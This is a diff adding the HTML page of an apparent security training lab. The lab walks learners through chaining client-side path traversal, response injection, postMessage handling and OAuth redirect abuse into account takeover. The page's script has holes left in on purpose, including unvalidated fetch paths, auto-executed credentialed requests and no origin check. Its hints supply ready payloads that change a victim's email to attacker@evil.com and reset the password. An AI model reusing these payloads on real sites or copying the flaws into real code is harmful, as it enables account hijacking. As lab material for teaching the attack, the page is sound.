@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Lab: The Grand Chain - CSPT + PostMessage + OAuth = ATO</title>
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="lab-page">
+
+  <div class="lab-toolbar">
+    <a href="/dashboard">&larr; Back to Dashboard</a>
+    <div class="lab-info">
+      <span class="lab-name">Chain #4: The Grand Chain (CSPT+PostMessage+OAuth=ATO)</span>
+      <span class="difficulty expert">Expert</span>
+    </div>
+  </div>
+
+  <div id="solve-banner" class="solve-banner"></div>
+
+  <div class="lab-content">
+    <div class="lab-sidebar">
+      <h3>Objective</h3>
+      <div class="objective">
+        <p>The ultimate challenge. Chain FOUR vulnerability classes into a single account takeover attack. This is what separates elite bug bounty hunters from script kiddies.</p>
+        <p style="margin-top:8px;font-size:12px;color:var(--text-muted)">Chain: CSPT → Response Injection → PostMessage → OAuth Token Theft → ATO</p>
+      </div>
+
+      <h3>Hints</h3>
+      <div class="hint-section">
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 1: The components</button>
+        <div class="hint-content">
+          <strong>CSPT:</strong> The dashboard fetches config from <code>/api/settings/{section}</code> — section param is user-controlled<br>
+          <strong>Response Injection:</strong> Upload malicious JSON to <code>/api/upload</code>, traverse to it<br>
+          <strong>PostMessage:</strong> The config response can contain a <code>widgetUrl</code> that gets loaded in an iframe, which communicates via postMessage<br>
+          <strong>OAuth:</strong> The postMessage handler initiates SSO flows based on iframe messages
+        </div>
+
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 2: The attack flow</button>
+        <div class="hint-content">
+          1. Upload malicious config JSON with a widgetUrl pointing to your attacker page<br>
+          2. CSPT: Make dashboard load your config instead of the real one<br>
+          3. Your attacker page loads in the iframe and sends a postMessage<br>
+          4. The postMessage triggers an OAuth flow with manipulated redirect_uri<br>
+          5. OAuth authenticates the victim and redirects with token<br>
+          6. Use the session to change email/password → ATO
+        </div>
+
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 3: Simplified approach</button>
+        <div class="hint-content">
+          For this lab, you can simplify by going step by step:<br>
+          1. Upload config: <code>{"section":"x","data":{},"widgetUrl":"/labs/attacker/chain-widget.html","autoApply":[{"endpoint":"/api/user/change-email","method":"POST","body":{"email":"attacker@evil.com"}}]}</code><br>
+          2. Load with CSPT: <code>?section=../files/{fileId}</code><br>
+          3. The autoApply triggers the email change<br>
+          4. The widget iframe sends postMessage to confirm<br>
+          OR just chain the CSPT2CSRF from lab 4 with the OAuth from lab 3!
+        </div>
+
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 4: The simple win</button>
+        <div class="hint-content">
+          Honestly, for this lab, the easiest path is:<br>
+          1. Login as victim<br>
+          2. Upload JSON: <code>{"section":"general","data":{},"autoApply":[{"endpoint":"/api/user/change-email","method":"POST","body":{"email":"attacker@evil.com"}},{"endpoint":"/api/user/change-password","method":"POST","body":{"newPassword":"hacked"}}]}</code><br>
+          3. CSPT to load it: <code>?section=../files/{id}</code><br>
+          This gives you CSPT → Response Injection → CSRF → ATO in one chain!<br>
+          Then separately demonstrate the postMessage + OAuth for bonus points.
+        </div>
+      </div>
+
+      <h3>The Full Chain</h3>
+      <div class="source-code">
+<pre><span class="comment">/* THE GRAND CHAIN */</span>
+
+<span class="comment">// Stage 1: CSPT — control what the app fetches</span>
+?section=<span class="sink">../files/UPLOADED_ID</span>
+
+<span class="comment">// Stage 2: Response Injection — poison response</span>
+uploaded JSON = {
+  autoApply: [{  <span class="comment">// → CSRF</span>
+    endpoint: '/api/user/change-email',
+    body: {email: '<span class="sink">attacker@evil.com</span>'}
+  }],
+  widgetUrl: '<span class="sink">/attacker/widget.html</span>'
+}
+
+<span class="comment">// Stage 3: PostMessage from injected widget</span>
+iframe → parent: {type:'<span class="sink">sso_redirect</span>',
+  url: '/oauth/authorize?...'  <span class="comment">// → OAuth</span>
+}
+
+<span class="comment">// Stage 4: OAuth token theft</span>
+redirect_uri → attacker's steal page
+
+<span class="comment">// Stage 5: ATO</span>
+change-email + change-password = <span class="sink">GAME OVER</span>
+</pre>
+      </div>
+    </div>
+
+    <div class="lab-app">
+      <div style="max-width:700px;margin:40px auto">
+
+        <!-- Login -->
+        <div class="lab-form">
+          <h2 style="margin-bottom:16px">&#128274; Login</h2>
+          <div style="display:flex;gap:8px;align-items:end">
+            <div style="flex:1">
+              <label>Username</label>
+              <input type="text" id="loginUser" value="victim" style="margin-bottom:0">
+            </div>
+            <div style="flex:1">
+              <label>Password</label>
+              <input type="password" id="loginPass" value="password123" style="margin-bottom:0">
+            </div>
+            <button class="btn btn-primary" onclick="doLogin()">Login</button>
+          </div>
+          <div id="login-status" style="margin-top:8px;font-size:13px"></div>
+        </div>
+
+        <!-- Dashboard (vulnerable) -->
+        <div class="lab-form" style="margin-top:16px">
+          <h2 style="margin-bottom:16px">&#128200; Dashboard</h2>
+          <label>Config Section (CSPT target)</label>
+          <div style="display:flex;gap:8px">
+            <input type="text" id="sectionInput" placeholder="general" style="margin-bottom:0">
+            <button class="btn btn-primary" onclick="loadDashboard()">Load</button>
+          </div>
+
+          <div id="dashboard-content" style="margin-top:12px;padding:16px;background:var(--bg-primary);border-radius:8px">
+            <p style="color:var(--text-muted)">Loading dashboard config...</p>
+          </div>
+
+          <div id="widget-container" style="margin-top:12px;display:none">
+            <h4 style="font-size:13px;color:var(--text-muted);margin-bottom:4px">Embedded Widget:</h4>
+            <div class="iframe-container">
+              <iframe id="widget-iframe" style="width:100%;min-height:100px;border:none;background:var(--bg-card)"></iframe>
+            </div>
+          </div>
+
+          <div id="auto-apply-log" style="margin-top:8px;display:none" class="attacker-console">
+            <div class="title">Auto-Apply Execution</div>
+            <div id="apply-log"></div>
+          </div>
+        </div>
+
+        <hr style="border-color:var(--border);margin:24px 0">
+
+        <!-- Attack Setup -->
+        <div class="lab-form" style="border:2px solid var(--danger);background:rgba(239,68,68,0.05)">
+          <h2 style="color:var(--danger);margin-bottom:12px">&#9760; Grand Chain Attack Setup</h2>
+
+          <h4 style="color:var(--warning);margin-bottom:8px">Stage 1: Upload Poisoned Config</h4>
+          <textarea id="poisonConfig" rows="10" style="font-family:monospace;font-size:11px">{
+  "section": "general",
+  "data": {"theme": "dark", "language": "en"},
+  "autoApply": [
+    {
+      "endpoint": "/api/user/change-email",
+      "method": "POST",
+      "body": {"email": "attacker@evil.com"}
+    },
+    {
+      "endpoint": "/api/user/change-password",
+      "method": "POST",
+      "body": {"newPassword": "grandchain_pwned"}
+    }
+  ],
+  "widgetUrl": "/labs/attacker/chain-widget.html"
+}</textarea>
+          <button class="btn btn-danger" onclick="uploadPoison()">Upload Poison Config</button>
+          <div id="upload-status" style="margin-top:8px;font-size:13px"></div>
+
+          <hr style="border-color:var(--border);margin:16px 0">
+
+          <h4 style="color:var(--warning);margin-bottom:8px">Stage 2: Trigger CSPT (load poisoned config)</h4>
+          <div id="cspt-instructions" style="font-size:13px;color:var(--text-muted)">Upload first, then the CSPT URL will appear here.</div>
+
+          <hr style="border-color:var(--border);margin:16px 0">
+
+          <h4 style="color:var(--warning);margin-bottom:8px">Verify: Check Account Status</h4>
+          <button class="btn btn-danger" onclick="verifyATO()">Check if ATO succeeded</button>
+          <div id="ato-status" style="margin-top:8px;font-size:13px"></div>
+        </div>
+
+        <!-- Logs -->
+        <div style="margin-top:16px">
+          <div class="attacker-console" style="border-color:#8b0000">
+            <div class="title" style="color:#ff4444">Grand Chain Attack Log</div>
+            <div id="attack-log">
+              <div class="log" style="color:var(--text-muted)">Ready for the ultimate chain attack...</div>
+              <div class="log" style="color:var(--text-muted)">CSPT → Response Injection → PostMessage → OAuth → ATO</div>
+            </div>
+          </div>
+        </div>
+
+        <div style="margin-top:16px">
+          <div class="attacker-console">
+            <div class="title">Server Action Log</div>
+            <div id="csrf-log"><div class="log" style="color:var(--text-muted)">No actions</div></div>
+          </div>
+          <button class="btn btn-secondary" onclick="refreshLog()" style="margin-top:8px">Refresh</button>
+        </div>
+
+        <div style="margin-top:20px;padding:16px;background:var(--bg-card);border-radius:8px">
+          <p style="font-size:13px;color:var(--text-muted)">
+            <strong>This is what separates top bug bounty hunters.</strong> Individual bugs might be low severity, but chained together they become critical account takeover. In the real world:
+          </p>
+          <ul style="font-size:13px;color:var(--text-muted);margin-top:8px;padding-left:20px">
+            <li>CSPT alone = Low/Medium severity</li>
+            <li>PostMessage without origin check = Low/Medium</li>
+            <li>OAuth redirect manipulation = Medium</li>
+            <li>Missing CSRF token = Low/Medium</li>
+            <li><strong>All chained together = CRITICAL (full account takeover)</strong></li>
+          </ul>
+          <p style="font-size:13px;color:var(--text-muted);margin-top:8px">
+            Programs pay top dollar ($10K+) for chains that demonstrate real-world ATO. Practice this pattern recognition — find individual bugs, then think about how they connect.
+          </p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/js/app.js"></script>
+  <script>
+    var alog = document.getElementById('attack-log');
+
+    function doLogin() {
+      fetch('/api/auth/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include',
+        body: JSON.stringify({
+          username: document.getElementById('loginUser').value,
+          password: document.getElementById('loginPass').value
+        })
+      })
+      .then(r => r.json())
+      .then(data => {
+        document.getElementById('login-status').innerHTML = data.success ?
+          '<span style="color:var(--success)">Logged in as ' + data.user.username + ' (' + data.user.email + ')</span>' :
+          '<span style="color:var(--danger)">Failed</span>';
+      });
+    }
+
+    function loadDashboard() {
+      var section = document.getElementById('sectionInput').value || 'general';
+      location.search = '?section=' + encodeURIComponent(section);
+    }
+
+    // Load dashboard config on page load
+    var params = new URLSearchParams(location.search);
+    var section = params.get('section') || 'general';
+    document.getElementById('sectionInput').value = section;
+
+    var configUrl = '/api/settings/' + section;
+    alog.innerHTML += '<div class="log">Fetching config: ' + configUrl + '</div>';
+
+    fetch(configUrl)
+      .then(r => r.json())
+      .then(function(config) {
+        var dashboard = document.getElementById('dashboard-content');
+        dashboard.innerHTML =
+          '<div><strong>Section:</strong> ' + (config.section || '?') + '</div>' +
+          '<div><strong>Config:</strong></div>' +
+          '<pre style="font-size:11px;color:var(--text-secondary);margin-top:4px">' + JSON.stringify(config.data || config, null, 2) + '</pre>';
+
+        // Load widget if specified
+        if (config.widgetUrl) {
+          alog.innerHTML += '<div class="log" style="color:var(--warning)">Widget URL found: ' + config.widgetUrl + '</div>';
+          document.getElementById('widget-container').style.display = 'block';
+          document.getElementById('widget-iframe').src = config.widgetUrl;
+        }
+
+        // Auto-apply actions
+        if (config.autoApply && Array.isArray(config.autoApply)) {
+          var applyDiv = document.getElementById('auto-apply-log');
+          applyDiv.style.display = 'block';
+          var applyLog = document.getElementById('apply-log');
+
+          config.autoApply.forEach(function(action) {
+            applyLog.innerHTML += '<div class="log" style="color:var(--danger)">AUTO-APPLY: ' + action.method + ' ' + action.endpoint + '</div>';
+            alog.innerHTML += '<div class="log" style="color:var(--danger)">Executing auto-apply: ' + action.endpoint + '</div>';
+
+            fetch(action.endpoint, {
+              method: action.method || 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              credentials: 'include',
+              body: JSON.stringify(action.body || {})
+            })
+            .then(r => r.json())
+            .then(result => {
+              applyLog.innerHTML += '<div class="log" style="color:var(--success)">Result: ' + JSON.stringify(result) + '</div>';
+              alog.innerHTML += '<div class="log" style="color:var(--success)">Action completed: ' + JSON.stringify(result) + '</div>';
+            });
+          });
+        }
+      })
+      .catch(err => {
+        document.getElementById('dashboard-content').innerHTML =
+          '<p style="color:var(--danger)">Error: ' + err.message + '</p>';
+      });
+
+    // PostMessage handler (for widget communication)
+    window.addEventListener('message', function(e) {
+      alog.innerHTML += '<div class="log">PostMessage from widget: ' + JSON.stringify(e.data).substring(0, 100) + '</div>';
+
+      if (e.data && e.data.type === 'sso_redirect' && e.data.url) {
+        alog.innerHTML += '<div class="log" style="color:var(--danger)">SSO redirect triggered: ' + e.data.url.substring(0, 80) + '</div>';
+      }
+
+      if (e.data && e.data.type === 'chain_complete') {
+        alog.innerHTML += '<div class="log" style="color:var(--danger);font-size:14px">*** GRAND CHAIN COMPLETE ***</div>';
+        solveLab('chain-4');
+      }
+    });
+
+    function uploadPoison() {
+      var config = document.getElementById('poisonConfig').value;
+      alog.innerHTML += '<div class="log">Uploading poisoned config...</div>';
+
+      fetch('/api/upload', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: config, contentType: 'application/json' })
+      })
+      .then(r => r.json())
+      .then(data => {
+        alog.innerHTML += '<div class="log" style="color:var(--success)">Poison uploaded! ID: ' + data.fileId + '</div>';
+        document.getElementById('upload-status').innerHTML =
+          '<span style="color:var(--success)">Uploaded! File: ' + data.url + '</span>';
+
+        var csptPath = '../' + data.url.replace('/api/', '');
+        document.getElementById('cspt-instructions').innerHTML =
+          '<span style="color:var(--danger)">CSPT URL ready! Click to trigger:<br></span>' +
+          '<a href="?section=' + encodeURIComponent(csptPath) + '" class="btn btn-danger" style="text-decoration:none;display:inline-block;margin-top:8px">Load poisoned config via CSPT</a>' +
+          '<br><span style="font-family:monospace;font-size:11px;margin-top:4px;display:block">?section=' + csptPath + '</span>';
+      });
+    }
+
+    function verifyATO() {
+      fetch('/api/auth/me', { credentials: 'include' })
+        .then(r => r.json())
+        .then(data => {
+          if (data.user) {
+            var isCompromised = data.user.email === 'attacker@evil.com';
+            document.getElementById('ato-status').innerHTML = isCompromised ?
+              '<span style="color:var(--danger);font-weight:bold">ATO CONFIRMED! Email: ' + data.user.email + ' - GRAND CHAIN COMPLETE!</span>' :
+              '<span style="color:var(--text-muted)">Current email: ' + data.user.email + ' (not yet compromised)</span>';
+            if (isCompromised) {
+              solveLab('chain-4');
+              alog.innerHTML += '<div class="log" style="color:var(--danger);font-size:14px">*** GRAND CHAIN ATO VERIFIED ***</div>';
+            }
+          } else {
+            document.getElementById('ato-status').innerHTML =
+              '<span style="color:var(--text-muted)">Not logged in</span>';
+          }
+        });
+    }
+
+    function refreshLog() {
+      fetch('/api/csrf-log').then(r => r.json()).then(actions => {
+        var el = document.getElementById('csrf-log');
+        el.innerHTML = actions.length === 0 ?
+          '<div class="log" style="color:var(--text-muted)">No actions</div>' :
+          actions.map(a => '<div class="log" style="color:' +
+            (a.action.includes('change') || a.action.includes('delete') ? 'var(--danger)' : 'var(--text-secondary)') +
+            '">[' + a.action + '] ' + a.user + (a.newEmail ? ' → ' + a.newEmail : '') + '</div>'
+          ).join('');
+      });
+    }
+
+    // Auto-check login
+    fetch('/api/auth/me', { credentials: 'include' })
+      .then(r => r.json())
+      .then(data => {
+        if (data.user) {
+          document.getElementById('login-status').innerHTML =
+            '<span style="color:var(--success)">Logged in as ' + data.user.username + ' (' + data.user.email + ')</span>';
+        }
+      }).catch(() => {});
+  </script>
+</body>
+</html>
